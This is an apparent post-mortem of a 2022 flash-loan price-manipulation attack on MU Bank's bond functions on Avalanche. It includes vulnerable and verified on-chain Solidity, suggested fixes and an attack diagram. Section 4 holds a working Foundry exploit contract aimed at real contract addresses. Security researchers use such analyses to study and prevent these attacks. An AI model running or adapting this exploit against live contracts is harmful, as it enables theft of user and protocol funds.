# MUMUG — mu_bond()/mu_gold_bond() Flash Loan Bond Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | MU Bank (MUMUG) |
| **Chain** | Avalanche |
| **Loss** | Unconfirmed |
| **MU Bank** | [0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab](https://snowtrace.io/address/0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab) |
| **MU Token** | [0xD036414fa2BCBb802691491E323BFf1348C5F4Ba](https://snowtrace.io/address/0xD036414fa2BCBb802691491E323BFf1348C5F4Ba) |
| **MUG Token** | [0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81](https://snowtrace.io/address/0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81) |
| **USDC.e** | [0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664](https://snowtrace.io/address/0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664) |
| **MU/MUG Pair** | [0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d](https://snowtrace.io/address/0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d) |
| **Joe Router** | [0x60aE616a2155Ee3d9A68541Ba4544862310933d4](https://snowtrace.io/address/0x60aE616a2155Ee3d9A68541Ba4544862310933d4) |
| **Root Cause** | The bond issuance price in `mu_bond()`/`mu_gold_bond()` relies on the AMM spot price (`_getMUSpotPrice()`), allowing price manipulation via a full MU dump within a single transaction to over-mint MUG (no TWAP / no cooldown) |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/MUMUG_exp.sol) |

---
## 1. Vulnerability Overview

MU Bank is a bond protocol built on the MU token, where users purchase bonds with USDC.e via the `mu_bond()` and `mu_gold_bond()` functions and receive MUG tokens as rewards. Bond prices were calculated based on the current market price of the MU token. The attacker flash-borrowed the entire MU token supply (minus 1) from the MU/MUG pair, swapped the borrowed MU for USDC.e to fund bond purchases, then called `mu_bond(3,300 USDC.e)` and `mu_gold_bond(6,990 USDC.e)` to acquire MUG tokens. The attacker then reverse-swapped USDC.e back to MU to repay the flash loan, and sold the remaining MUG for USDC.e to realize profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable MU Bank — bond purchase possible with flash loan funds
contract MUBank {
    IERC20 public muToken;
    IERC20 public mugToken;
    IERC20 public usdce;

    // ❌ Flash loan + bond purchase allowed within the same transaction
    // ❌ MU price derived from AMM spot price → manipulable
    function mu_bond(uint256 usdceAmount) external {
        usdce.transferFrom(msg.sender, address(this), usdceAmount);

        // ❌ MUG mint amount calculated from current AMM spot price
        // Flash loan dumps large MU → MU price drops
        // → same USDC.e amount yields more MUG
        uint256 muPrice = _getMUSpotPrice();
        uint256 mugAmount = usdceAmount * 1e18 / muPrice;

        mugToken.transfer(msg.sender, mugAmount);
    }

    function mu_gold_bond(uint256 usdceAmount) external {
        // ❌ Same spot price vulnerability
        usdce.transferFrom(msg.sender, address(this), usdceAmount);
        uint256 muPrice = _getMUSpotPrice();
        uint256 mugAmount = usdceAmount * GOLD_MULTIPLIER / muPrice;
        mugToken.transfer(msg.sender, mugAmount);
    }
}

// ✅ Correct pattern — TWAP-based pricing + flash loan protection
contract SafeMUBank {
    uint256 public constant BOND_LOCK_PERIOD = 1 days;
    mapping(address => uint256) public lastBondTime;

    function mu_bond(uint256 usdceAmount) external {
        // ✅ Prevent consecutive bond purchases (blocks flash loans)
        require(block.timestamp >= lastBondTime[msg.sender] + BOND_LOCK_PERIOD,
            "Bond cooldown active");
        lastBondTime[msg.sender] = block.timestamp;

        usdce.transferFrom(msg.sender, address(this), usdceAmount);

        // ✅ Use TWAP price
        uint256 muTwapPrice = _getMUTWAPPrice(30 minutes);
        uint256 mugAmount = usdceAmount * 1e18 / muTwapPrice;
        mugToken.transfer(msg.sender, mugAmount);
    }
}
```


### On-Chain Source Code

Source: **Etherscan-verified** (V2 API, chainid 43114) — MuBank `0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab`

The real `mu_bond()` signature is `mu_bond(address stable, uint256 amount)` — the stable-coin address is passed as a parameter. The price derives from `_mu_bond_quote()` which reads spot reserves from the MU/USDC.e Trader Joe LP pair (`0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5`) via `Pair.getReserves()` with no TWAP or cooldown.

```solidity
// ✅ Etherscan-verified source — MuBank 0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab (Avalanche)

function mu_bond(address stable, uint256 amount) public nonReentrant {
    require(is_approved_stable_coin(stable) ,"Only accepting approved stable coins for bonding");
    IERC20 _stable = IERC20(stable);
    Token token = Token(stable);
    uint8 _decimals = token.decimals();
    uint256 _adjusted_amount;
    if(18 - _decimals == 0)
        _adjusted_amount = amount;
    else {
        _adjusted_amount = (amount/(10**(18-_decimals)));
    }
    require(_stable.balanceOf(msg.sender) >= _adjusted_amount, "You don't have enough of that token to bond that amount");
    (uint256 mu_coin_swap_amount, uint256 mu_coin_amount) = _mu_bond_quote(amount); // ❌ reads AMM spot price
    require(IERC20(_MuCoin).balanceOf(address(this)) >= mu_coin_amount, "This contract does not have enough Mu Coin");
    _stable.transferFrom(msg.sender, address(this), _adjusted_amount);
    IERC20(_MuCoin).transfer(msg.sender, mu_coin_amount);
    MuMoneyMinter(_MuMoney).mint(address(this), amount);    
}

function mu_gold_bond(address stable, uint256 amount) public nonReentrant{
    require(is_approved_stable_coin(stable) ,"Only accepting approved stable coins for bonding");
    
    IERC20 _stable = IERC20(stable);
    Token token = Token(stable);
    uint8 _decimals = token.decimals();
    uint256 _adjusted_amount;
    if(18 - _decimals == 0)
        _adjusted_amount = amount;
    else {
        _adjusted_amount = (amount/(10**(18-_decimals)));
    }
    require(_stable.balanceOf(msg.sender) >= _adjusted_amount, "You don't have enough of that token to bond that amount");
        (uint256 mu_gold_swap_amount, uint256 mu_gold_bond_amount)  = _get_mug_bond_quote(amount); // ❌ reads AMM spot price
        require(IERC20(_MuGold).balanceOf(address(this)) >= mu_gold_bond_amount, "This contract does not have enough Mu Coin");
        _stable.transferFrom(msg.sender, address(this), _adjusted_amount);
        IERC20(_MuGold).transfer(msg.sender, mu_gold_bond_amount);
        MuMoneyMinter(_MuMoney).mint(address(this), amount);

}

// ❌ Price oracle: reads current AMM spot reserves — manipulable in the same transaction
function _mu_bond_quote(uint256 amount) internal view returns(uint256 swapAmount, uint256 bondAmount){
    Router router = Router(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
    //Pair USDC.e/MU token0 is USDC.e (6) token1 is Mu Coin (18)
    (uint112 reserve0, uint112 reserve1) = Pair(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5).getReserves();//MU/USDC.e TJ LP // ❌ spot reserves
    reserve0 = reserve0 * (10 ** 12);
    uint256 amountIN = router.getAmountIn(amount, reserve1, reserve0);
    uint256 amountOUT = router.getAmountOut(amount, reserve0, reserve1);
    uint256 mu_coin_bond_amount = (((((amountIN + amountOUT)*10))/2)/10); // ❌ derived from spot price — manipulable via flash loan
    return (amountOUT, mu_coin_bond_amount);
}

function _get_mug_bond_quote(uint256 amount) internal view returns (uint256 swapAmount, uint256 bondAmount){
    Router router = Router(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
    address muMugPool = 0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d;
    address muPool = 0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5;
    
    //get swap amount and bond amount of Mu Coin
    (uint112 reserve0, uint112 reserve1) = Pair(muPool).getReserves();//MU/USDC.e TJ LP // ❌ spot reserves
    reserve0 = reserve0 * (10 ** 12);
    uint256 amountIN = router.getAmountIn(amount, reserve1, reserve0);
    uint256 amountOUT = router.getAmountOut(amount, reserve0, reserve1);
    uint256 mu_coin_swap_amount = amountOUT;
    uint256 mu_coin_bond_amount = (((((amountIN + amountOUT)*10))/2)/10);

    //mu/mug pool token0 is mu coin (18) and token1 is mu gold (18)
    ( reserve0,  reserve1) = Pair(muMugPool).getReserves();//MU/USDC.e TJ LP // ❌ second spot read — also manipulable
    uint256 mugSwapamountOUT = router.getAmountOut(mu_coin_swap_amount, reserve0, reserve1);

    uint256 mugBondamountIN = router.getAmountIn(mu_coin_bond_amount, reserve1, reserve0);
    uint256 mugBondamountOUT = router.getAmountOut(mu_coin_bond_amount, reserve0, reserve1);
    uint256 mu_gold_bond_amount = (((((mugBondamountIN + mugBondamountOUT)*10))/2)/10); // ❌ derived from manipulated reserves

    
    //return amount of Mu Gold that could be achived via swap vs achived via bonding from the bank
    return(mugSwapamountOUT, mu_gold_bond_amount);
}
```

**Why it is exploitable (identify the bug from the code):**

- `_mu_bond_quote()` calls `Pair(0xfacB3892...).getReserves()` on the MU/USDC.e LP and computes bond amounts from the current spot reserve ratio. Reserves are changed by any swap, including swaps executed in the same transaction's flash-loan callback.
- The attacker borrowed almost the entire MU supply from the MU/MUG pair via Trader Joe flash swap, then swapped it all for USDC.e. This drained the MU reserve, crashing the computed MU price.
- With MU price near zero, `_mu_bond_quote()` returns an astronomically large `mu_coin_bond_amount` for the same USDC.e input, and `_get_mug_bond_quote()` similarly over-quotes MUG.
- `mu_bond()` has a `nonReentrant` guard but no flash-loan detection — `nonReentrant` only blocks re-entry into the same function, not a call from a flash-loan callback in a different call frame.
- There is no TWAP window and no per-block cooldown preventing bond purchase inside the flash callback.

```solidity
// ✅ Fix: use a TWAP price and block bond purchases in the same block as a large price move
function mu_bond(uint256 usdceAmount) external {
    require(block.timestamp >= lastBondTime[msg.sender] + 1 days, "Cooldown"); // ✅
    lastBondTime[msg.sender] = block.timestamp;
    usdce.transferFrom(msg.sender, address(this), usdceAmount);
    uint256 muTwapPrice = oracle.consult(address(muToken), 1e18, 30 minutes); // ✅ TWAP
    uint256 mugAmount = usdceAmount * 1e18 / muTwapPrice;
    mugToken.transfer(msg.sender, mugAmount);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan entire MU token supply (-1) from MU/MUG pair
    │       Enter joeCall() callback
    │
    ├─[2] Swap MU → USDC.e (Joe Router)
    │       Large MU dump → MU price drops (or acquire USDC.e)
    │
    ├─[3] Call mu_bond(USDC.e, 3,300e18)
    │       ❌ Over-issue MU Coin at manipulated / flash-loan-based MU price
    │       3,300 USDC.e (18-dec) → acquire excess MU Coin
    │
    ├─[4] Call mu_gold_bond(USDC.e, 6,990e18)
    │       ❌ Same vulnerable price reference
    │       6,990 USDC.e (18-dec) → acquire excess MU Gold
    │
    ├─[5] Reverse-swap USDC.e → MU to repay flash loan
    │
    ├─[6] Sell remaining MUG → USDC.e
    │       MUG holdings → realize profit
    │
    └─[7] Net profit: USDC.e arbitrage gain
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IMUBank {
    function mu_bond(address stable, uint256 amount) external;       // real verified signature
    function mu_gold_bond(address stable, uint256 amount) external;  // real verified signature
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IPair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract MUMUGExploit is Test {
    IMUBank  muBank  = IMUBank(0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab);
    IERC20   MU      = IERC20(0xD036414fa2BCBb802691491E323BFf1348C5F4Ba);
    IERC20   MUG     = IERC20(0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81);
    IERC20   USDCe   = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IPair    pair    = IPair(0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d);
    IRouter  router  = IRouter(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);

    function setUp() public {
        vm.createSelectFork("avax", 23_435_294);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC.e", USDCe.balanceOf(address(this)), 6);

        // [Step 1] Flash loan entire MU supply (-1) from MU/MUG pair
        (uint112 muReserve,,) = pair.getReserves();
        pair.swap(uint256(muReserve) - 1, 0, address(this), abi.encode(true));

        emit log_named_decimal_uint("[End] USDC.e", USDCe.balanceOf(address(this)), 6);
    }

    function joeCall(address, uint256 muAmount, uint256, bytes calldata) external {
        // [Step 2] Swap MU → USDC.e
        MU.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(MU); path[1] = address(USDCe);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MU.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // [Step 3] Purchase mu_bond
        // ⚡ Over-receive MU Coin due to flash-loan-based price manipulation
        USDCe.approve(address(muBank), type(uint256).max);
        muBank.mu_bond(address(USDCe), 3_300 * 1e18); // real signature: mu_bond(address stable, uint256 amount)

        // [Step 4] Purchase mu_gold_bond
        muBank.mu_gold_bond(address(USDCe), 6_990 * 1e18); // real signature: mu_gold_bond(address stable, uint256 amount)

        // [Step 5] Reverse-swap USDC.e → MU to fund flash loan repayment
        path[0] = address(USDCe); path[1] = address(MU);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDCe.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Repay flash loan
        MU.transfer(address(pair), muAmount);

        // [Step 6] Sell MU Gold → USDC.e (profit from over-issued MUG tokens)
        MUG.approve(address(router), type(uint256).max);
        path[0] = address(MUG); path[1] = address(USDCe);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MUG.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | `mu_bond()`/`mu_gold_bond()` flash loan-based MU price manipulation |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | Price oracle manipulation + bond protocol vulnerability |
| **Attack Vector** | Joe flash loan (full MU supply) → MU→USDC.e swap → `mu_bond()` + `mu_gold_bond()` → reverse swap repayment → MUG→USDC.e |
| **Preconditions** | `mu_bond()` bond price is AMM spot price-based; bond purchase permitted within a flash loan |
| **Impact** | USDC.e arbitrage gain (amount unconfirmed) |

---
## 6. Remediation Recommendations

1. **Bond Purchase Cooldown**: Restrict `mu_bond()` so that re-purchase requires at least 1 block or a set time interval to elapse after the previous call, blocking immediate bond purchases within a flash loan.
2. **TWAP-Based Bond Pricing**: Calculate the bond issuance price using a TWAP of 30 minutes or longer instead of the AMM spot price, preventing single-block price manipulation.
3. **Flash Loan Detection**: Introduce a reentrancy-guard pattern that disallows bond purchases while a flash loan callback is executing within the transaction.

---
## 7. Lessons Learned

- **Price Vulnerability in Bond Protocols**: Bond protocols in the Olympus DAO lineage frequently use a bond issuance structure directly pegged to the token price. Using spot prices makes them vulnerable to flash loan price manipulation.
- **Flash Loan Attacks on Avalanche**: The same flash loan + bond manipulation pattern that appeared on ETH/BSC also manifested in the Avalanche ecosystem. As each chain's ecosystem matures, similar attacks are ported across.
- **Full-Supply Flash Loan of MU Tokens**: Borrowing the entire token supply in a pair via flash loan is an extreme manipulation that completely neutralizes the spot price. Bond protocols must use manipulation-resistant external oracles.